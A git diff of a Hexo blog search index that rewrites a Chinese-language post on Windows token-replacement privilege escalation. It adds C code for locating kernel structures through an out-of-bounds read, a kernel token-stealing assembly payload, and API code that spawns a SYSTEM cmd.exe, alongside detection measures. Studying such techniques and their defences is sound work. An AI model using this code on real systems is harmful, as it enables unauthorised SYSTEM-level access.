@@ -1,7 +1,7 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>Hello World</title>
+    <title>hello word</title>
     <url>/2022/01/11/hello-world/</url>
     <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
 <span id="more"></span>
@@ -21,103 +21,28 @@
 ]]></content>
   </entry>
   <entry>
-    <title>Process Token 替换</title>
-    <url>/2022/01/12/Token%E6%9B%BF%E6%8D%A2/</url>
-    <content><![CDATA[<p>Process Token 替换</p>
-<span id="more"></span>
-
-<h1 id="R3获取System-EProcess"><a href="#R3获取System-EProcess" class="headerlink" title="R3获取System EProcess"></a>R3获取System EProcess</h1><ol>
-<li> 定位到NT执行体模块的内存地址</li>
-</ol>
-<p>这里借助了EnumDeviceDrivers函数去获取系统中的所有设备驱动程序的加载地址。</p>
-<p><img src="media/c1bd534d64079fbad37aa1e5a550b987.png"></p>
-<p>这一步需要注意一点，NT模块名字在不同的环境下名字不同，因此不能直接写死。</p>
-<p><img src="media/f7fe4a1c240689e73c4aca40058707ee.jpeg" alt="C:\\Users\\jiabin3\\Documents\\My
-Knowledge\\temp\\e68cfb15-03d0-4a29-9826-e8772f41d636\\128\\index_files\\c94cf827-ad9d-4687-8fca-bab5b591972f.jpg"></p>
-<ol>
-<li> 获取PsInitialSystemProcess动态执行地址</li>
-</ol>
-<p>根据官方文档的描述，在NT执行体模块中有一个导出变量PsInitialSystemProcess，其指向System<br>Eprocess的地址。</p>
-<p><img src="media/5c4858166db9c043446231b99e4f534c.png" alt="C:\\Users\\jiabin3\\Documents\\My
-Knowledge\\temp\\e68cfb15-03d0-4a29-9826-e8772f41d636\\128\\index_files\\46740dcb-8d22-4b52-83d5-e62447f902eb.png"></p>
-<p>因此就可以通过PsInitialSystemProcess获取其值了。</p>
-<p><img src="media/62a9d589efcda95b380ea3d6a80925a7.png"></p>
-<ol>
-<li> 通过EPROCESS遍历进程（ActiveProcessLinks）,找到目标</li>
-</ol>
-<p><img src="media/052cc71b9159cb8447961cc81efe6e2c.png" alt="C:\\Users\\jiabin3\\Documents\\My
-Knowledge\\temp\\e68cfb15-03d0-4a29-9826-e8772f41d636\\128\\index_files\\4cae3a7a-233d-4f1a-bac2-0409009f4d7d.png"></p>
-<p><img src="media/b4c7f04f32358be50ba12555cfeed42f.png"></p>
-<h1 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h1><ol>
-<li> 访问令牌替换</li>
-</ol>
-<p>通常使用高权限进程（system）“偷“来的令牌来创建一个新进程。</p>
-<p>具体利用方法，放到第三小节单独进行阐述。</p>
-<ol>
-<li> 命令管道的利用</li>
-</ol>
-<p>核心：ImpersonateNamedPipeClient函数，服务端进程模拟已连接的客户端进程。</p>
-<p>以SeImpersonatePrivilege权限去启动命名管道服务端进行监听，与system权限的客户端进行连接，可以利用客户端将权限提升至<br>System 权限</p>
-<p><img src="media/1d3550120e0cfd7a948c39c4d54c3be7.png"></p>
-<ol>
-<li> DLL劫持</li>
-</ol>
-<p>Windows程序启动的时候需要DLL。如果这些DLL<br>不存在，则可以通过在应用程序要查找的位置放置恶意DLL来提权。通常，Windows应用程序有其预定义好的搜索DLL的路径，它会根据下面的顺序进行搜索：</p>
-<p><img src="media/93dcd2a09834f8689e764bd80120cb2d.png"></p>
-<ol>
-<li> 映像劫持</li>
-</ol>
-<p>通过修改注册表键值HKEY_LOCAL_MACHINESOFTWAREMicrosoftWindows<br>NTCurrentVersionImage File Execution Options来达到劫持目的。放置恶意DLL来提权</p>
-<ol>
-<li> 劫持环境变量$path</li>
-</ol>
-<p>当系统的环境变量$PATH满足以下条件时，会造成提权漏洞</p>
-<ul>
-<li><p>  文件夹当前用户可写</p>
-</li>
-<li><p>  路径在c:\windows\system32\之前</p>
-</li>
-</ul>
-<h1 id="Token替换方式"><a href="#Token替换方式" class="headerlink" title="Token替换方式"></a>Token替换方式</h1><ol>
-<li> Token指针替换（_EX_FAST_REF替换）</li>
-</ol>
-<p><img src="media/ef00c924869af6b2e192e92e2ad0eeae.png"></p>
-<p>将当前进程 EPROCESS 中存储的 Token 指针替换为 System 进程的 Token<br>指针。<img src="media/8fa26365487da2b6d834513a62f2e15e.png"></p>
-<p><img src="media/3401c459fb166336ffa15b475fa9615e.png"></p>
-<ol>
-<li> Token中的成员替换</li>
-</ol>
-<p>将当前进程 EPROCESS 的成员 Token 指针指向的 Token 块中的数据替换成 System<br>进程拥有的 Token 块的数据</p>
-<p><img src="media/c248277aa1e61ea5ccd4a9560c329bb5.png"></p>
-<p>将Present和Enabled的值更改为SYSTEM进程令牌的所有权限。</p>
-<p><img src="media/3375b082fbf94c912ddf3c4ef977376b.png" alt="C:\\Users\\jiabin3\\Documents\\My
-Knowledge\\temp\\b3057e77-1c2b-4962-a420-dbb5338cbe27\\128\\index_files\\4c98465b-5835-47c0-99c9-2bfa31b3d559.png"></p>
-<ol>
-<li> 通过Windows API窃取令牌</li>
-</ol>
-<p>通过OpenProcessToken获取system进程的访问令牌，然后通过DuplicateTokenEx复制Token。最后用复制的令牌运行目标进程。</p>
-<p><img src="media/c7a3905e4f183b2450d0925e4172a5f2.png"></p>
-<h1 id="防护措施"><a href="#防护措施" class="headerlink" title="防护措施"></a>防护措施</h1><ol>
-<li> SACL记录访问事件(winlogon.exe)—检测</li>
-</ol>
-<p>此方法可针对通过OpenProcessToken、DuplicateTokenEx窃取高权限令牌。(记录在ETW)</p>
-<p><img src="media/337219a8c9ac39d6845213ffef21b914.png"></p>
-<ol>
-<li> Token 地址匹配</li>
-</ol>
-<p>恶意进程窃取令牌目的是为了起一个新的进程。因此可以提前记录system token address.</p>
+    <title>Token替换</title>
+    <url>/2022/01/13/Token%E6%9B%BF%E6%8D%A2/</url>
+    <content><![CDATA[<h1 id="Process-Token-替换"><a href="#Process-Token-替换" class="headerlink" title="Process Token 替换"></a>Process Token 替换</h1><h2 id="R3获取System-EProcess"><a href="#R3获取System-EProcess" class="headerlink" title="R3获取System EProcess"></a>R3获取System EProcess</h2><h3 id="1-定位到NT执行体模块的内存地址"><a href="#1-定位到NT执行体模块的内存地址" class="headerlink" title="1.定位到NT执行体模块的内存地址"></a>1.定位到NT执行体模块的内存地址</h3><p>这里借助了<code>EnumDeviceDrivers</code>函数去获取系统中的所有设备驱动程序的加载地址。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DWORD32 GetKernelBase()</span><br><span class="line">&#123;</span><br><span class="line">	PVOID driversAddress[1024] = &#123; 0 &#125;;</span><br><span class="line">	DWORD cbNeeded = 0;</span><br><span class="line">	int cDrivers = 0;</span><br><span class="line">	int ntoskrnlKernelBase = 0;</span><br><span class="line"></span><br><span class="line">	// find ntoskrnl.exe kernel base</span><br><span class="line">	if (EnumDeviceDrivers(driversAddress, sizeof(driversAddress), &amp;cbNeeded) &amp;&amp; cbNeeded &lt; sizeof(driversAddress))</span><br><span class="line">	&#123;</span><br><span class="line"></span><br><span class="line">		cDrivers = cbNeeded / sizeof(driversAddress[0]);</span><br><span class="line"></span><br><span class="line">		for (int i = 0; i &lt; cDrivers; i++)</span><br><span class="line">		&#123;</span><br><span class="line">			if (GetDeviceDriverBaseName(driversAddress[i], driverName, 1024))</span><br><span class="line">			&#123;</span><br><span class="line">				TCHAR* lowerName = _wcslwr(driverName);</span><br><span class="line"></span><br><span class="line">				if (!wcsncmp(driverName, L&quot;nt&quot;, 2)) &#123;</span><br><span class="line"></span><br><span class="line">					ntoskrnlKernelBase = i;</span><br><span class="line">					break;</span><br><span class="line">				&#125;</span><br><span class="line">				else &#123;</span><br><span class="line">					if (i == (cDrivers - 1)) &#123;</span><br><span class="line">						_tprintf(L&quot;can&#x27;t find driver name\n&quot;);</span><br><span class="line">						exit(0);</span><br><span class="line">					&#125;</span><br><span class="line">					continue;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			else &#123;</span><br><span class="line">				_tprintf(L&quot;get device driver name failed\n&quot;);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	else</span><br><span class="line">	&#123;</span><br><span class="line">		_tprintf(L&quot;Enumerate Device Drivers failed\n&quot;);</span><br><span class="line">		return 0;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	_tprintf(L&quot;driver name is: %s\n&quot;, driverName);</span><br><span class="line">	return (DWORD32)driversAddress[ntoskrnlKernelBase];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这一步需要注意一点，NT模块名字在不同的环境下名字不同，因此不能直接写死。<br><img src="https://tvax2.sinaimg.cn/large/0075Vlv2ly1gybty7e83jj30lo03swes.jpg" alt="f7fe4a1c240689e73c4aca40058707ee"></p>
+<h3 id="2-获取PsInitialSystemProcess动态执行地址"><a href="#2-获取PsInitialSystemProcess动态执行地址" class="headerlink" title="2.获取PsInitialSystemProcess动态执行地址"></a>2.获取PsInitialSystemProcess动态执行地址</h3><p>根据官方文档的描述，在NT执行体模块中有一个导出变量<code>PsInitialSystemProcess</code>，其指向System<br>Eprocess的地址。<br><img src="https://tvax2.sinaimg.cn/large/0075Vlv2ly1gybtz0hiv8j30o00280tf.jpg" alt="5c4858166db9c043446231b99e4f534c"></p>
+<p>因此就可以通过<code>PsInitialSystemProcess</code>获取其值了。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DWORD_PTR GetSystemEProcessAddr() </span><br><span class="line">&#123;</span><br><span class="line">	//获取NT执行体模块基地址</span><br><span class="line">    DWORD_PTR ntoskrnlKernelBase = GetKernelBase();</span><br><span class="line">    //获取NT模块基地址</span><br><span class="line">	DWORD_PTR ntoskrnlUserBase = (DWORD_PTR)LoadLibrary(driverName);</span><br><span class="line">	if (ntoskrnlUserBase == NULL) </span><br><span class="line">	&#123;</span><br><span class="line">		_tprintf(L&quot;load library failed!\n&quot;);</span><br><span class="line">		return 0;</span><br><span class="line">	&#125;</span><br><span class="line">	DWORD_PTR PsInitialSystemProcessUserSpaceAddr = (DWORD_PTR)GetProcAddress((HMODULE)ntoskrnlUserBase, &quot;PsInitialSystemProcess&quot;);</span><br><span class="line">    //PsInitialSystemProcess动态地址 = 获取NT执行体模块基地址 + (获取NT模块基地址 - PsInitialSystemProcess静态地址)</span><br><span class="line">	DWORD_PTR PsInitialSystemProcessKernelSpaceAddr = ntoskrnlKernelBase + (PsInitialSystemProcessUserSpaceAddr - ntoskrnlUserBase);</span><br><span class="line"></span><br><span class="line">	return PsInitialSystemProcessKernelSpaceAddr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="3-通过EPROCESS遍历进程（ActiveProcessLinks）-找到目标"><a href="#3-通过EPROCESS遍历进程（ActiveProcessLinks）-找到目标" class="headerlink" title="3.通过EPROCESS遍历进程（ActiveProcessLinks）,找到目标"></a>3.通过EPROCESS遍历进程（ActiveProcessLinks）,找到目标</h3><p><img src="https://tvax2.sinaimg.cn/large/0075Vlv2ly1gybu0l08k2j30mg037q4j.jpg" alt="052cc71b9159cb8447961cc81efe6e2c"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//查找当前进程token</span><br><span class="line">ReadOOB(hManager, hWorker, (SystemEProcessAddr + dwPLinkOffset), &amp;ProcessListLink,sizeof(DWORD32));</span><br><span class="line"></span><br><span class="line">CurrentPid = GetCurrentProcessId();</span><br><span class="line"></span><br><span class="line">while (TRUE)</span><br><span class="line">&#123;</span><br><span class="line">	DWORD32 dwTempPid = 0;</span><br><span class="line">	DWORD32 dwTempEProcessAddr = 0;</span><br><span class="line"></span><br><span class="line">	dwTempEProcessAddr = (DWORD32)((PUCHAR)ProcessListLink.Flink - dwPLinkOffset);</span><br><span class="line">	ReadOOB(hManager, hWorker,(dwTempEProcessAddr + dwPidOffset), &amp;dwTempPid, sizeof(DWORD32));</span><br><span class="line">	if (dwTempPid == CurrentPid)</span><br><span class="line">	&#123;</span><br><span class="line">		_tprintf(L&quot;[+]Get Current Process Addr: 0x%x\n&quot;, dwTempEProcessAddr);</span><br><span class="line">		_tprintf(L&quot;[+]Get Current Process Id: 0x%x\n&quot;, dwTempPid);</span><br><span class="line">		//ReadOOB(hManager, hWorker, (dwTempEProcessAddr + 0xf8), &amp;lpCurrentTokenAddress, sizeof(DWORD32));</span><br><span class="line">		CurrentTokenAddress = dwTempEProcessAddr + dwTokenOffset;</span><br><span class="line">		break;</span><br><span class="line">	&#125;</span><br><span class="line">	ReadOOB(hManager, hWorker, (dwTempEProcessAddr + dwPLinkOffset), &amp;ProcessListLink, sizeof(LIST_ENTRY));;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="Token替换方式"><a href="#Token替换方式" class="headerlink" title="Token替换方式"></a>Token替换方式</h2><h3 id="1-Token指针替换（-EX-FAST-REF替换）"><a href="#1-Token指针替换（-EX-FAST-REF替换）" class="headerlink" title="1.Token指针替换（_EX_FAST_REF替换）"></a>1.Token指针替换（_EX_FAST_REF替换）</h3><p><img src="https://tva1.sinaimg.cn/large/0075Vlv2ly1gybu1ecmi8j30ok045q4f.jpg" alt="ef00c924869af6b2e192e92e2ad0eeae"><br>将当前进程 EPROCESS 中存储的 Token 指针替换为 System 进程的 Token 指针。<br><img src="https://tvax4.sinaimg.cn/large/0075Vlv2ly1gybu2bbj7ej30s80axdl8.jpg" alt="8fa26365487da2b6d834513a62f2e15e"></p>
+<h4 id="汇编内联"><a href="#汇编内联" class="headerlink" title="汇编内联"></a>汇编内联</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">VOID TokenStealingPayloadWin7Generic() &#123;</span><br><span class="line">    // No Need of Kernel Recovery as we are not corrupting anything</span><br><span class="line">    __asm &#123;</span><br><span class="line">        pushad                               ; Save registers state</span><br><span class="line"> </span><br><span class="line">        ; Start of Token Stealing Stub</span><br><span class="line">        xor eax, eax                         ; Set ZERO</span><br><span class="line">        mov eax, fs:[eax + KTHREAD_OFFSET]   ; Get nt!_KPCR.PcrbData.CurrentThread</span><br><span class="line">                                             ; _KTHREAD is located at FS:[0x124]</span><br><span class="line"> </span><br><span class="line">        mov eax, [eax + EPROCESS_OFFSET]     ; Get nt!_KTHREAD.ApcState.Process</span><br><span class="line"> </span><br><span class="line">        mov ecx, eax                         ; Copy current process _EPROCESS structure</span><br><span class="line"> </span><br><span class="line">        mov edx, SYSTEM_PID                  ; WIN 7 SP1 SYSTEM process PID = 0x4</span><br><span class="line"> </span><br><span class="line">        SearchSystemPID:</span><br><span class="line">            mov eax, [eax + FLINK_OFFSET]    ; Get nt!_EPROCESS.ActiveProcessLinks.Flink</span><br><span class="line">            sub eax, FLINK_OFFSET</span><br><span class="line">            cmp [eax + PID_OFFSET], edx      ; Get nt!_EPROCESS.UniqueProcessId</span><br><span class="line">            jne SearchSystemPID</span><br><span class="line"> </span><br><span class="line">        mov edx, [eax + TOKEN_OFFSET]        ; Get SYSTEM process nt!_EPROCESS.Token</span><br><span class="line">        mov [ecx + TOKEN_OFFSET], edx        ; Replace target process nt!_EPROCESS.Token</span><br><span class="line">                                             ; with SYSTEM process nt!_EPROCESS.Token</span><br><span class="line">        ; End of Token Stealing Stub</span><br><span class="line"> </span><br><span class="line">        popad                                ; Restore registers state</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="2-Token中的成员替换"><a href="#2-Token中的成员替换" class="headerlink" title="2.Token中的成员替换"></a>2.Token中的成员替换</h3><p>将当前进程 EPROCESS的成员Token指针指向的Token块中的数据替换成System<br>进程拥有的Token块的数据</p>
+<p><img src="https://tva2.sinaimg.cn/large/0075Vlv2ly1gybu4850ysj30ob045taj.jpg" alt="c248277aa1e61ea5ccd4a9560c329bb5"></p>
+<p>将<code>Present</code>和<code>Enabled</code>的值更改为SYSTEM进程令牌的所有权限。<br><img src="https://tva4.sinaimg.cn/large/0075Vlv2ly1gybu4jbupjj30ee02szlt.jpg" alt="3375b082fbf94c912ddf3c4ef977376b"></p>
+<h3 id="3-通过Windows-API窃取令牌"><a href="#3-通过Windows-API窃取令牌" class="headerlink" title="3.通过Windows API窃取令牌"></a>3.通过Windows API窃取令牌</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if (!GetProIDByName(L&quot;Winlogon.exe&quot;, &amp;ulWinlogonPID) || !ulWinlogonPID)</span><br><span class="line">	return;</span><br><span class="line"></span><br><span class="line">hProc = OpenProcess(</span><br><span class="line">	PROCESS_QUERY_INFORMATION,</span><br><span class="line">	FALSE,</span><br><span class="line">	ulWinlogonPID );</span><br><span class="line"></span><br><span class="line">OpenProcessToken(</span><br><span class="line">	hProc,</span><br><span class="line">	TOKEN_ASSIGN_PRIMARY | TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY,</span><br><span class="line">	&amp;hToken);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">SECURITY_IMPERSONATION_LEVEL seImpersonateLevel = SecurityImpersonation;</span><br><span class="line">TOKEN_TYPE tokenType = TokenPrimary;</span><br><span class="line">if (!DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL, seImpersonateLevel, tokenType, &amp;hEopToken))</span><br><span class="line">	return;</span><br><span class="line"></span><br><span class="line">/* Starts a new process with SYSTEM token */</span><br><span class="line">STARTUPINFOW si = &#123;&#125;;</span><br><span class="line">PROCESS_INFORMATION pi = &#123;&#125;;</span><br><span class="line">CreateProcessWithTokenW(</span><br><span class="line">	hEopToken,</span><br><span class="line">	LOGON_NETCREDENTIALS_ONLY,</span><br><span class="line">	L&quot;C:\\Windows\\System32\\cmd.exe&quot;,</span><br><span class="line">	NULL,</span><br><span class="line">	CREATE_NEW_CONSOLE,</span><br><span class="line">	NULL,</span><br><span class="line">	NULL,</span><br><span class="line">	&amp;si,</span><br><span class="line">	&amp;pi);</span><br></pre></td></tr></table></figure>
+<h2 id="防护措施"><a href="#防护措施" class="headerlink" title="防护措施"></a>防护措施</h2><h3 id="1-SACL记录访问事件-winlogon-exe-—检测"><a href="#1-SACL记录访问事件-winlogon-exe-—检测" class="headerlink" title="1.SACL记录访问事件(winlogon.exe)—检测"></a>1.SACL记录访问事件(winlogon.exe)—检测</h3><p>此方法可针对通过<code>OpenProcessToken</code>、<code>DuplicateTokenEx</code>窃取高权限令牌。(记录在ETW)<br><img src="https://tva1.sinaimg.cn/large/0075Vlv2ly1gybu7jr29jj30lw0acgqh.jpg" alt="337219a8c9ac39d6845213ffef21b914"></p>
+<h3 id="2-Token-地址匹配"><a href="#2-Token-地址匹配" class="headerlink" title="2.Token 地址匹配"></a>2.Token 地址匹配</h3><p>恶意进程窃取令牌目的是为了起一个新的进程。因此可以提前记录system token address.</p>
 <p>Hook CreateProcessWithToken去验证token地址(父进程与system)是否一致。</p>
 <p>地址获取：EPROCESS-&gt;EX_FAST_REF-&gt;object &amp; 0xFFFFFFF0</p>
-<ol>
-<li> Hook DuplicateToeknEx(可能有误报)</li>
-</ol>
-<p>拦截system token 被复制。</p>
-<ol>
-<li> Token 跟踪</li>
-</ol>
-<p>Hook<br>CreateProcess当有新的进程（cmd）启动时候，复制一份token。当此进程有DuplicateToeknEx、CloseHandle等操作，则对token进行验证，若发生变化则可以说明此进程进行了token替换。</p>
-<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://www.ired.team/">https://www.ired.team/</a></p>
-<p><a href="https://www.ired.team/offensive-security/privilege-escalation/windows-namedpipes-privilege-escalation">https://www.ired.team/offensive-security/privilege-escalation/windows-namedpipes-privilege-escalation</a></p>
+<h3 id="3-Hook-DuplicateToeknEx-可能有误报"><a href="#3-Hook-DuplicateToeknEx-可能有误报" class="headerlink" title="3.Hook DuplicateToeknEx(可能有误报)"></a>3.Hook DuplicateToeknEx(可能有误报)</h3><p>拦截system token 被复制。</p>
+<h3 id="4-Token-跟踪"><a href="#4-Token-跟踪" class="headerlink" title="4.Token 跟踪"></a>4.Token 跟踪</h3><p>Hook CreateProcess当有新的进程（cmd）启动时候，复制一份token。当此进程有DuplicateToeknEx、CloseHandle等操作，则对token进行验证，若发生变化则可以说明此进程进行了token替换。</p>
 ]]></content>
   </entry>
 </search>
